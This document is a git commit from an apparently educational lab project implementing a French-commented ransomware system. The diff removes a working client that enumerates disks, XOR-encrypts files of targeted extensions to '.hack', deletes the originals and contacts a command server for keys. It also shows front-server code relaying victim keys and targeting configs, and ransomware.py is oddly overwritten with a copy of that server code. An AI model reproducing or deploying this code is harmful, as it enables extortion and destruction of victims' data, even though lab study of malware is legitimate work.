aeeda6bcc7dfb3e19c3ce88a61abb1ff0d9c2394
Adib2810 <titifasad@gmail.com>
2024-05-26 22:23:47 +0200

    labo 5 finit

--- ransomware/ransomware.py
+++ ransomware/ransomware.py
@@ -1,282 +1,129 @@
-import os
-
-import utile.config
+import string
+import random
+import time
 import utile.network as network
 import utile.message as message
+import utile.security as security
 import utile.config as config
-from platform import node, win32_edition, system
-from hashlib import sha256
-from re import search
-from os import path
-import random
-import shutil
-import psutil
-import re
-from time import time as current_time
-import time
+import queue
+from threading import Thread
 
-# Constantes
-DEBUG_MODE = False
-AES_GCM = True
-PORT_SERV_FRONTAL = 8443
-LAST_STATE = None
-
-
-def initialize():
-    """
-    Procédure d'initialisation du ransomware
-    :return: Néant
-    """
-    global LAST_STATE
-
-    # Vérifie si un hash est enregistré, sinon génère un hash
-
-
-def os_type():
-    """
-    Retourne le type d'operating system
-    :return: None si le système n'est pas un microsoft windows ou (str) "SERVER" ou "WORKSTATION"
-    """
-    if search("[Ww]indows", system()):
-        if search("[Ss]erver", win32_edition()):
-            return "SERVER"
-        else:
-            return "WORKSTATION"
-    return None
-
-
-def list_disks():
-    partitions = psutil.disk_partitions()
-    # Ne filtre pas par type de disque pour inclure tous les disques connectés
-    disques = [partition.device for partition in partitions]
-    return disques
-
-
-def explore(chemin):
-    contenu = []
-    if not os.path.exists(chemin):
-        print("Le chemin spécifié n'existe pas.")
-        return contenu
-
-    for element in os.listdir(chemin):
-        chemin_complet = os.path.join(chemin, element)
-        contenu.append(chemin_complet)
-        if os.path.isdir(chemin_complet):
-            contenu.extend(explore(chemin_complet))
-    return contenu
-
-
-def file_type(fichier):
-    if os.path.isdir(fichier):
-        return "dir"
-    else:
-        return os.path.splitext(fichier)[1]
-
-
-def xor_cipher(key, data):
-    return bytearray(a ^ b for a, b in zip(bytearray(key), bytearray(data)))
-
-
-def chiffre(fichier_source, key):
-    if not os.path.exists(fichier_source):
-        print("Le fichier spécifié n'existe pas.")
-        return ""
-
-    if not os.path.isfile(fichier_source):
-        print("Le chemin spécifié ne correspond pas à un fichier.")
-        return ""
-
-    # Obtient le nom du fichier sans extension
-    nom_fichier, extension = os.path.splitext(fichier_source)
-    # Crée le nouveau nom de fichier avec l'extension .hack
-    fichier_hacker = nom_fichier + ".hack"
-
-    # Copie le contenu du fichier source vers le fichier cible
-    with open(fichier_source, "rb") as file_source:
-        contenu = file_source.read()
-        contenu_chiffre = xor_cipher(key.encode(), contenu)
-
-    with open(fichier_hacker, "wb") as file_hack:
-        file_hack.write(contenu_chiffre)
-
-    # Supprime le fichier source
-    os.remove(fichier_source)
-    print(f"Fichier source {fichier_source} supprimé.")
-    return 1
-
-
-def dechiffre(fichier_source, key):
-    if not os.path.exists(fichier_source):
-        print("Le fichier spécifié n'existe pas.")
-        return ""
-
-    if not os.path.isfile(fichier_source):
-        print("Le chemin spécifié ne correspond pas à un fichier.")
-        return ""
-
-    # Obtient le nom du fichier sans extension
-    nom_fichier, extension = os.path.splitext(fichier_source)
-    # Crée le nouveau nom de fichier avec l'extension .hack
-    fichier_hacker = nom_fichier + ".safe"
-
-    # Copie le contenu du fichier source vers le fichier cible
-    with open(fichier_source, "rb") as file:
-        contenu = file.read()
-        contenu_dechiffre = xor_cipher(key.encode(), contenu)
-
-    with open(fichier_hacker, "wb") as f_dechiffre:
-        f_dechiffre.write(contenu_dechiffre)
-
-    # Supprime le fichier source
-    os.remove(fichier_source)
-    print(f"Fichier source {fichier_source} supprimé.")
-    return 1
-
+load = config.load_config('../configuration/config/serveur_frontal.cfg', '../configuration/config/serveur_frontal.key')
+PORT = 8381
+PORT_RANSOMWARE = 8443
+IP_FRONT = '192.168.133.18'
+CONFIG_SERVEUR = config.load_config('../configuration/config/serveur.cfg', '../configuration/config/serveur.key')
+CONFIG_WORKSTATION = config.load_config('../configuration/config/workstation.cfg','../configuration/config/workstation.key')
 
 def simulate_hash(longueur=0):
-    identifiant = f'{node()}{current_time()}'
-    return identifiant
+    letters = string.hexdigits
+    return ''.join(random.choice(letters) for i in range(longueur))
 
 
 def main():
-    global AES_GCM
-    global DEBUG_MODE
-    global IP_SERV_FRONTAL
-    global PORT_SERV_FRONTAL
-    global LAST_STATE
+    queue_principale = queue.Queue()
+    t_srv_cles = Thread(target=thread_srv_cles, args=(queue_principale,), daemon=True)
+    t_srv_cles.start()
+    queue_principale.get()
+    queue_principale.task_done()
+    s_serveur = network.start_net_serv( port=PORT_RANSOMWARE)
+    while True:
+        conn_victim, address_victim = s_serveur.accept()
+        q_multi_ransomware = queue.Queue()
+        t_victims = Thread(target=thread_ransomware, args=(conn_victim,queue_principale, q_multi_ransomware,),daemon=True)
+        t_victims.start()
+def thread_srv_cles(queue_principale):
+    # Connection vers le serveur de clés
+    s_srv_cles = network.connect_to_serv(port=PORT, retry=60)
+    aes_key = security.diffie_hellman_recv_key(s_srv_cles)
+    # Utilise la queue FIFO q_messages_receiv pour valider la connexion au serveur de cles
+    queue_principale.put('SERVEUR_CLE_CONNECTED') # La il confirme qu'il s'est connecté
+    queue_principale.join()  # Attend que le main lance l'écoute des ransomwares
 
-    # Load configuration
-    # config.load_config('config/ransomware.cfg', 'config/ransomware.bin')
-    # AES_GCM = config.get_config('AES_GCM')
-    # DEBUG_MODE = config.get_config('DEBUG_MODE')
-    # IP_SERV_FRONTAL = config.get_config('IP_SERV_FRONTAL')
-    # PORT_SERV_FRONTAL = int(config.get_config('PORT_SERV_FRONTAL'))
-
-    # Vérifie le dernier état sauvegardé
-    config.load_config('config/ransomware.cfg', 'config/ransomware.bin')
-    LAST_STATE = config.get_config('LAST_STATE')
-    hash = config.get_config('HASH')
-    print("LAST_STATE = ", str(LAST_STATE))
-    if LAST_STATE is None:
-        hash = config.get_config('HASH')
-        if hash is None:
-            hash = simulate_hash()
-            config.set_config('HASH', hash)
-            config.save_config('config/ransomware.cfg', 'config/ransomware.bin')
-        # Détermine le type d'OS
-        system = os_type()
-        if system is None:
-            print("pas un windows")  # Si l'OS n'est pas un Microsoft Windows sortie du Ransomware
-
-        # Détermine les disques disponibles
-        disks = list_disks()
-
-        # Construction du message d'initialisation du RANSOMWARE
-        msg = message.set_message("initialize_req", [hash, system, disks])
-        # Sauvegarde des paramètres d'initialisation du Ransomware
-        config.set_config('OS', system)
-        config.set_config('DISKS', disks)
-        config.save_config('config/ransomware.cfg', 'config/ransomware.bin')
-
-        # Connection vers le serveur frontal
-        conn_frontal = network.connect_to_serv(port=PORT_SERV_FRONTAL)
-
-        # Envoi de la demande d'initialisation vers le serveur frontal
-        network.send_message(conn_frontal, msg)
-        print("Le message : " + str(msg) + "est envoyé")  # Il envoie ini req avec le hash dedans
-
-        # Réception de la configuration
-        msg = network.receive_message(conn_frontal)
-        print("Le message : " + str(msg))
+    while True:
+        msg = queue_principale.get()
+        print("message thread serv clé : " + str(msg))# Réceptionne les msg en queue reçu des ransomware
+        # on execute pas le code tant qu'on recoit pas de message_ransomware
+        # Retire la queue FIFO du ransomware où envoyer la réponse
+        if 'queue' in msg.keys():
+            q_reponse = msg['queue'] # la il prend pour le ransomware 1
+            msg.pop('queue')  # Retire la clé 'queue' du dictionnaire msg
         msg_type = message.get_message_type(msg)
-        conn_frontal.close()
-        if msg_type == 'INITIALIZE_RESP':
-            print("Message reçu est INI_RESP")
-            # Sauvegarde de la configuration réceptionnée
-            config.set_config('ID_DB', msg['CONFIGURE'])
-            config.set_config('DISKS', msg['SETTING']['DISKS'])
-            config.set_config('PATHS', msg['SETTING']['PATHS'])
-            config.set_config('FILE_EXT', msg['SETTING']['FILE_EXT'])
-            config.set_config('FREQ', msg['SETTING']['FREQ'])
-            config.set_config('KEY', msg['SETTING']['KEY'])
-            config.set_config('LAST_STATE', 'INITIALIZE')  # Signifie que la configuration est complète
-            config.save_config('config/ransomware.cfg', 'config/ransomware.bin')
-            LAST_STATE = "CRYPT"
-
-    if LAST_STATE == 'CRYPT' or LAST_STATE == 'INITIALIZE':
-        config.set_config('LAST_STATE', 'PENDING')
-        config.save_config('config/ransomware.cfg', 'config/ransomware.bin')
-        conn_frontal = network.connect_to_serv(port=PORT_SERV_FRONTAL)
-        id_vct = utile.config.get_config('ID_DB')
-        start_crypt = message.set_message("CRYPT_START",[id_vct] )
-        network.send_message(conn_frontal, start_crypt)
-        hash = utile.config.get_config("HASH")
-        start_restart =  message.set_message("RESTART_REQ",[hash] )
-        network.send_message(conn_frontal, start_restart)
-        restart_rep = network.receive_message(conn_frontal)
-        print(restart_rep)
-        key = restart_rep["KEY"]
-        print(start_crypt)
-        disks = config.get_config('DISKS')
-        print(disks)
-        paths = config.get_config('PATHS')
-        file_ext = config.get_config('FILE_EXT')
-        nb_files_encrypted = config.get_config('NB_FILES_ENCRYPTED')
-        if nb_files_encrypted is None:
-            nb_files_encrypted = 0
-        disques = [chaine.replace("'", "") for chaine in disks]
-        # Enlever les guillemets simples extérieurs de chaque élément de la liste
-        extensions = []
-        for element in file_ext:
-            # Supprimer tous les guillemets simples de chaque extension et diviser la chaîne par la virgule
-            extensions.extend(element.replace("'", "").split(','))
-        chemin = []
-        for element in paths:
-            # Supprimer tous les guillemets simples de chaque extension et diviser la chaîne par la virgule
-            chemin.extend(element.replace("'", "").split(','))
-        for disk in disques:
-            os.chdir(disk)
-            for folder_path in chemin:
-                for (root, dirs, files) in os.walk(folder_path, topdown=True):
-                    for filename in files:
-                        if os.path.splitext(filename)[1] in extensions:  # Si l'extension est dans les types à chiffrer
-                            nb_files_encrypted += chiffre(f"\{root}\{filename}", key)
-                            print(f"Le ransomware a chiffré {nb_files_encrypted} fichiers.")
-        LAST_STATE = "PENDING"
+        if msg_type == 'CRYPT_START':
+            msg = security.aes_encrypt(msg, aes_key)
+            network.send_message(s_srv_cles, msg)
+        if msg_type == 'RESTART_REQ':
+            msg = security.aes_encrypt(msg, aes_key)
+            network.send_message(s_srv_cles, msg)
+            msg = network.receive_message(s_srv_cles)
+            msg = security.aes_decrypt(msg, aes_key)
+            msg_type = message.get_message_type(msg)
+            if msg_type == 'RESTART_RESP':
+                print(f"L'ID de la nouvelle victime est : {msg['RESTART_RESP']}")
+                print(f"Sa clé de chiffrement est :")
+                print(f"{msg['KEY']}")
+                q_reponse.put(msg)
+        if msg_type == "PENDING_MSG":
+            msg = security.aes_encrypt(msg, aes_key)
+            network.send_message(s_srv_cles, msg)
+            msg = network.receive_message(s_srv_cles)
+            print("recoit decrypt")
+            msg = security.aes_decrypt(msg, aes_key)
+            msg_type = message.get_message_type(msg)
+            q_reponse.put(msg)
+            print("l'envoie au thread rans")
+        if msg_type == 'INITIALIZE_REQ':
+            msg = security.aes_encrypt(msg, aes_key)
+            network.send_message(s_srv_cles, msg)
+            # Réception de la réponse
+            msg = network.receive_message(s_srv_cles)
+            msg = security.aes_decrypt(msg, aes_key)
+            msg_type = message.get_message_type(msg)
+            if msg_type == 'INITIALIZE_KEY':
+                q_reponse.put(msg)
 
 
-    if LAST_STATE == "PENDING":
-        conn_frontal = network.connect_to_serv(port=PORT_SERV_FRONTAL)
-        hash = utile.config.get_config("HASH")
-        start_pending = message.set_message("PENDING_MSG", [hash])
-        print(start_pending)
-        network.send_message(conn_frontal, start_pending)
-        print("message envoyé")
-        msg = network.receive_message(conn_frontal)
-        print(msg)
-        msg_type = utile.message.get_message_type(msg)
-        if msg_type == "DECRYPT_REQ":
-            LAST_STATE = "DECRYPT"
-            key = msg["KEY"]
-            hash = msg["DECRYPT"]
+def thread_ransomware(conn_victim, queue_principale, q_multi_ransomware):
+    while True:
+        msg = network.receive_message(conn_victim)
+        if msg is None:
+            time.sleep(1)  # Ajouter un délai pour éviter le bouclage rapide
+            break
+        else:
+            msg_type = message.get_message_type(msg)
+            # Si le message reçu est un list_victim_req
+            if msg_type == 'INITIALIZE_REQ':
+                msg['queue'] = q_multi_ransomware    # le message est envoyé vers la queue de chaque ransomware propre a lui
+                queue_principale.put(msg)
+                key_resp = q_multi_ransomware.get()
+                if msg['OS'] == 'SERVEUR':
+                    config_ransomware = CONFIG_SERVEUR
+                else:
+                    config_ransomware = CONFIG_WORKSTATION
+                msg = message.set_message('initialize_resp', [key_resp['KEY_RESP'], config_ransomware['DISKS'], config_ransomware['PATHS'], config_ransomware['FILE_EXT'], config_ransomware['FREQ'], key_resp['KEY'], key_resp['STATE']])
+                network.send_message(conn_victim, msg)
+                print("Message envoyé a la victime : " + str(msg))
+            elif msg_type == 'CRYPT_START':
+                msg['queue'] = q_multi_ransomware  # le message est envoyé vers la queue de chaque ransomware propre a lui
+                queue_principale.put(msg)
+                time.sleep(5)
+            elif msg_type == 'PENDING_MSG':
+                msg['queue'] = q_multi_ransomware  # le message est envoyé vers la queue de chaque ransomware propre a lui
+                queue_principale.put(msg)
+                decrypt_resp = q_multi_ransomware.get()
+                print("recoit decrypt_resp = " + str(decrypt_resp))# Réception du msg venant du serveur de clés
+                msg = message.set_message("DECRYPT_REQ", [decrypt_resp["DECRYPT"], decrypt_resp["KEY"]])
+                network.send_message(conn_victim, msg)
+                time.sleep(5)
+            elif msg_type == 'RESTART_REQ':
+                print("Message RESTART REQ")
+                msg['queue'] = q_multi_ransomware  # le message est envoyé vers la queue de chaque ransomware propre a lui
+                queue_principale.put(msg)
+                restart_resp = q_multi_ransomware.get()
+                print(restart_resp)  # Réception du msg venant du serveur de clés
+                msg = message.set_message("RESTART_RESP", [restart_resp["RESTART_RESP"], restart_resp["KEY"]])
+                network.send_message(conn_victim, msg)
 
-    if LAST_STATE == 'DECRYPT':
-        disks = config.get_config('DISKS')
-        paths = config.get_config('PATHS')
-        disques = [chaine.replace("'", "") for chaine in disks]
-        # Enlever les guillemets simples extérieurs de chaque élément de la liste
-        chemin = []
-        for element in paths:
-            # Supprimer tous les guillemets simples de chaque extension et diviser la chaîne par la virgule
-            chemin.extend(element.replace("'", "").split(','))
-        for disk in disques:
-            os.chdir(disk)
-            for folder_path in chemin:
-                for (root, dirs, files) in os.walk(folder_path, topdown=True):
-                    for filename in files:
-                        if filename.endswith('.hack'):  # Si l'extension est dans les types à dechiffrer
-                            dechiffre(f"\{root}\{filename}", key)
-                            print("Déchiffrement fait ")
 
 
 if __name__ == '__main__':
--- serveur_frontal/serveur_frontal.py
+++ serveur_frontal/serveur_frontal.py
@@ -1,7 +1,6 @@
 import string
 import random
 import time
-
 import utile.network as network
 import utile.message as message
 import utile.security as security
@@ -15,7 +14,6 @@ PORT_RANSOMWARE = 8443
 IP_FRONT = '192.168.133.18'
 CONFIG_SERVEUR = config.load_config('../configuration/config/serveur.cfg', '../configuration/config/serveur.key')
 CONFIG_WORKSTATION = config.load_config('../configuration/config/workstation.cfg','../configuration/config/workstation.key')
-status_victims = {}
 
 def simulate_hash(longueur=0):
     letters = string.hexdigits
@@ -23,23 +21,17 @@ def simulate_hash(longueur=0):
 
 
 def main():
-    queue_principale = queue.Queue()  # Queue FIFO réceptionnant toutes les demandes venant des ransomware
-    # Démarrage du Thread de communication avec le serveur de clés
-    t_srv_cles = Thread(target=thread_srv_cles, args=(queue_principale,), daemon=True)
-    t_srv_cles.start()
-
-    queue_principale.get()  # Attend que le serveur frontal soit connecté au serveur de clés avant de lancer le code
-    # il recoit dans le thread serveur cle, "SERVEUR_CLE_CONNECTED"
-    print("[Serveur frontal] - Serveur de clés connecté.")
-    queue_principale.task_done()  # Libère le thread srv clés
-    s_serveur = network.start_net_serv( port=PORT_RANSOMWARE)
+    queue_principale = queue.Queue()
+    Thread(target=thread_srv_cles, args=(queue_principale,), daemon=True).start()
+    queue_principale.get()
+    queue_principale.task_done()
+    s_serveur = network.start_net_serv(port=PORT_RANSOMWARE)
     while True:
         conn_victim, address_victim = s_serveur.accept()
-        print(f"[Serveur frontal] : Connexion d'un ransomware {address_victim} a été établie.")
-        q_multi_ransomware = queue.Queue()  # Queue FIFO réponse victime
-        # Démarrage du Thread de communication avec le ransomware
-        t_victims = Thread(target=thread_ransomware, args=(conn_victim,queue_principale, q_multi_ransomware,),daemon=True)
-        t_victims.start()
+        print("Connected to server : " + str(conn_victim) + ", address : " + str(address_victim))
+        q_multi_ransomware = queue.Queue()
+        Thread(target=thread_ransomware, args=(conn_victim,queue_principale, q_multi_ransomware,),daemon=True).start()
+
 def thread_srv_cles(queue_principale):
     # Connection vers le serveur de clés
     s_srv_cles = network.connect_to_serv(port=PORT, retry=60)
@@ -88,10 +80,6 @@ def thread_srv_cles(queue_principale):
             msg = security.aes_decrypt(msg, aes_key)
             msg_type = message.get_message_type(msg)
             if msg_type == 'INITIALIZE_KEY':
-                print(f"L'ID de la nouvelle victime est : {msg['KEY_RESP']}")
-                print(f"Son dernier état connu en DB est : {msg['STATE']}")
-                print(f"Sa clé de chiffrement est :")
-                print(f"{msg['KEY']}")
                 q_reponse.put(msg)
 
 
@@ -105,37 +93,21 @@ def thread_ransomware(conn_victim, queue_principale, q_multi_ransomware):
             msg_type = message.get_message_type(msg)
             # Si le message reçu est un list_victim_req
             if msg_type == 'INITIALIZE_REQ':
-                if msg['INITIALIZE'] in status_victims.keys():
-                    print(f"{msg['INITIALIZE']}")
-                else:
-                    status_victims[msg['INITIALIZE']] = 'INITIALIZE'
-                    print("status victims : " + str(status_victims))
                 msg['queue'] = q_multi_ransomware    # le message est envoyé vers la queue de chaque ransomware propre a lui
-                queue_principale.put(msg)          # Envoi du msg en queue
-                key_resp = q_multi_ransomware.get()  # Réception du msg venant du serveur de clés
+                queue_principale.put(msg)
+                key_resp = q_multi_ransomware.get()
                 if msg['OS'] == 'SERVEUR':
                     config_ransomware = CONFIG_SERVEUR
                 else:
                     config_ransomware = CONFIG_WORKSTATION
-                # params ==> 0 = id, 1 = disks, 2 = paths, 3 = file_ext, 4 =freq, 5 = key
                 msg = message.set_message('initialize_resp', [key_resp['KEY_RESP'], config_ransomware['DISKS'], config_ransomware['PATHS'], config_ransomware['FILE_EXT'], config_ransomware['FREQ'], key_resp['KEY'], key_resp['STATE']])
                 network.send_message(conn_victim, msg)
                 print("Message envoyé a la victime : " + str(msg))
             elif msg_type == 'CRYPT_START':
-                if msg['CRYPT'] in status_victims.keys():
-                    print(f"{msg['CRYPT']}")
-                else:
-                    status_victims[msg['CRYPT']] = 'CRYPT'
-                    print("status victims : " + str(status_victims))
                 msg['queue'] = q_multi_ransomware  # le message est envoyé vers la queue de chaque ransomware propre a lui
                 queue_principale.put(msg)
                 time.sleep(5)
             elif msg_type == 'PENDING_MSG':
-                if msg['PENDING'] in status_victims.keys():
-                    print(f"{msg['PENDING']}")
-                else:
-                    status_victims[msg['PENDING']] = 'PENDING'
-                    print("status victims : " + str(status_victims))
                 msg['queue'] = q_multi_ransomware  # le message est envoyé vers la queue de chaque ransomware propre a lui
                 queue_principale.put(msg)
                 decrypt_resp = q_multi_ransomware.get()
